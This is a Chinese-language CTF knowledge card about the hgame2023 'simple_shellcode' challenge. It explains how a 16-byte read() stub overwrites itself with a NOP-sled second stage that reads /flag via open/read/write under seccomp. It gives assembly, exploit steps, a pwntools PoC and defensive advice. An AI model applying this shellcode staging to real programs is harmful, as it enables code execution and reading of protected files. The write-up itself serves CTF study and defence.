---
id: binary-pwn-sandbox-escape-short-shellcode-self-overwrite-nop-sled-orw
title: read 只给 0x10 字节的 shellcode 题：首段 stub 调 read(0, 同址 RWX 缓冲区, 0x1000) 自我覆盖，第二段前置 NOP 滑板吸收 syscall 返回后的 RIP 偏移，再走 open/read/write ORW
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: tiny-stub-self-overwrite-read-nop-sled-orw
aliases:
- hgame2023 simple_shellcode
- 0x10 字节 shellcode
- 首段 read 自我覆盖
- NOP 滑板吸收 RIP 偏移
- 二阶段 shellcode ORW
- mmap RWX 固定地址 shellcode
tags:
- binary
- ctf
- pwn
- shellcode
- two-stage
- self-overwrite
- nop-sled
- orw
- seccomp
- mmap
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V685
  verified_at: '2026-11-13T14:40:46+08:00'
  notes: 已对照原文全文与22张截图核对（本卡对应 img/01-06）：图01 seccomp-tools 显示 execve/execveat→KILL、其余 ALLOW；图02 checksec Full RELRO/Canary/NX enabled/PIE；图03 main 为 mmap(0xCAFE0000,0x1000,7,33,-1,0)+read(0,0xCAFE0000,0x10)+sandbox()+MEMORY[0xCAFE0000]()；图04 vmmap 0xcafe0000 rwxp；图05/06 GDB 显示 16 字节 stub（xor eax,eax;xor edi,edi;mov edx,0x1000;mov esi,0xcafe0000;syscall）且 RAX=0/RDI=0/RDX=0x1000，与卡内 layout 一致；exp 中 b'\x90'*0x100 + shellcraft.open/read(3,0xCAFE0500,0x500)/write(1,...) 与原文一致。NOP 滑板吸收 RIP=0xCAFE0010 偏移、open 返回 fd3 等为按 exp 结构的推断，原文未给文字解释与 flag 输出截图，confidence=medium 合理。路径 binary/pwn/sandbox-escape 与既有 tiny-shellcode-read-self-loop-staging、register-reuse-reread-staging 等同类卡一致；dedup 判定其为不同 staging 机制（jmp 回跳 vs NOP 滑板）成立，非重复链。未验证点：未本地复现 hgame2023 题。
---

## 一句话结论

当题目把用户首段 shellcode 读进一块固定地址的 RWX 缓冲区、却只允许读 0x10 字节时，首段不必直接完成 ORW：用 16 字节 `read(0, 同一缓冲区地址, 0x1000)` 把第二段读进正在执行的同一地址、覆盖自身；syscall 返回后 RIP 落在缓冲区 +0x10，第二段只要以足够长的 NOP 滑板开头，就能从残留偏移滑入真正的 open/read/write 代码。seccomp 只禁 `execve/execveat` 时，二阶段用 shellcraft 的 ORW 读 flag。

## 原理

- **题面结构（hgame2023-simple_shellcode）**：`mmap((void*)0xCAFE0000, 0x1000, 7, 33, -1, 0)` 在固定地址 0xCAFE0000 建 RWX 段（vmmap 显示 `rwxp`），随后 `read(0, 0xCAFE0000, 0x10)` 只读 16 字节，过 `sandbox()` 后直接 `MEMORY[0xCAFE0000]()` 执行。seccomp 规则只对 `execve`、`execveat` 返回 KILL，其余 ALLOW，所以不能弹 shell，但 open/read/write 都可用。
- **首段为什么用 read 而不是直接 ORW**：16 字节放不下 open+read+write 的参数布置；但 16 字节刚好够一次 `read(0, buf, 0x1000)`：
  ```asm
  xor eax, eax        ; 31 c0      rax = 0 (SYS_read)
  xor edi, edi        ; 31 ff      rdi = 0 (stdin)
  mov edx, 0x1000     ; ba 00 10 00 00
  mov esi, 0xcafe0000 ; be 00 00 fe ca
  syscall             ; 0f 05
  ```
  合计恰好 16 字节。
- **为什么“读到自己头上”还能继续执行**：`read` 的目标地址就是当前执行缓冲区 0xCAFE0000；syscall 位于偏移 0x0e，返回后 RIP = 0xCAFE0010（首段长度 16）。此时第二段数据已经从 0xCAFE0000 开始写入，覆盖了首段所在的全部字节。CPU 从 0xCAFE0010 取指，看到的是第二段在偏移 0x10 处的字节。
- **NOP 滑板的作用**：第二段以 `b"\x90" * 0x100` 开头，RIP 落在偏移 0x10～0x100 内任意位置都会执行 NOP 直到滑到后面的 shellcraft 代码；因此不需要精确计算首段长度与续写偏移的关系，只要滑板长度大于首段长度即可。x86 指令缓存与数据缓存一致，同一核心上“syscall 写入—返回取指”不会读到旧指令。
- **二阶段 ORW**：`open("/flag")` 通常返回 fd 3，随后 `read(3, 0xCAFE0500, 0x500)`、`write(1, 0xCAFE0500, 0x500)` 把 flag 打到 stdout；0xCAFE0500 是 RWX 段内不会与代码/数据冲突的读缓冲区。

## 触发条件

- 首段 shellcode 被写入并执行的缓冲区地址固定且可写可执行（`mmap` 固定地址、无 ASLR 或地址已知）；hgame2023 中为 0xCAFE0000。
- 首段可读长度恰好能容纳一条“设置 read 参数 + syscall”的短 stub（本例 16 字节；更短的长度需要复用入口寄存器或换更短的指令序列）。
- seccomp 至少允许 `read`（首段自己就是 read）以及二阶段要用的 `open/read/write`；本例只禁 `execve/execveat`。
- 攻击者能分两轮发送数据：先发首段，再发第二段。

## 利用步骤

1. 发送 16 字节首段 `read(0, 0xCAFE0000, 0x1000)`。
2. 发送第二段：`0x100` 字节 NOP 滑板 + `open("/flag")` + `read(fd, 0xCAFE0500, 0x500)` + `write(1, 0xCAFE0500, 0x500)`。首段 syscall 返回后 RIP=0xCAFE0010，落入滑板。
3. 程序输出 flag。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64')

sc = asm('''
xor eax, eax
xor edi, edi
mov edx, 0x1000
mov esi, 0xcafe0000
syscall
''')                       # 恰好 16 字节
p.recvuntil(b"shellcode:")
p.send(sc)

stage2  = b"\x90" * 0x100  # 吸收 syscall 返回后的 RIP 偏移
stage2 += asm(shellcraft.open("/flag"))
stage2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))
stage2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))
p.send(stage2)

p.interactive()
```

说明：原文为 pwntools 完整 exp 的核心片段；`read` 的 fd 3 取自 `open` 的典型返回值，若目标环境 fd 不固定，应把 `open` 的返回（rax）传给 `read`。

## 变体与关联

- **首段更短时**：若 read 长度小于 16 字节，可复用入口寄存器（如 `rax`、`rsi` 已指向缓冲区）把 stub 缩短；或把 `mov esi, imm32` 换成 `push/pop` 组合。
- **地址不固定**：若缓冲区地址未知/ASLR 开启，需要先泄露地址或改用 `rsp`/入口寄存器相对寻址，不能硬编码 `0xCAFE0000`。
- **seccomp 限制不同**：禁 open 用 `openat`，禁 read 用 `pread64/readv`，禁 write 用 `sendfile`。
- **NOP 滑板的通用性**：任何“续写位置与当前 RIP 有小幅偏移”的二阶段场景都可用滑板吸收；与栈上 `jmp rsp` 铺满的思路互补。
- 关联：`[[ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile]]`（用重复 gadget 吸收落地偏移）、`[[ctf-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw]]`（二阶段 readv 续写 shellcode）、`[[ctf-pwn-call-eax-stack-shellcode-byte-inc1]]`（同一缓冲区先变形再执行）。

## 检测与防御

- 本题是 CTF 题面设计问题：执行前一次性读入全部输入，不要“先执行首段再允许二次读入”；或首段读取后把该页 `mprotect` 为 RX（W^X），让二阶段无法写入可执行内存；或把缓冲区地址随机化并在 seccomp 中禁掉 `read`（只允许 openat/sendfile 等完成读 flag）。
- 现实程序侧同理：不要执行来自可写内存的代码，启用 NX/W^X 与 CFI；任何“用户可控数据被当作代码执行”的设计都应视为 RCE。
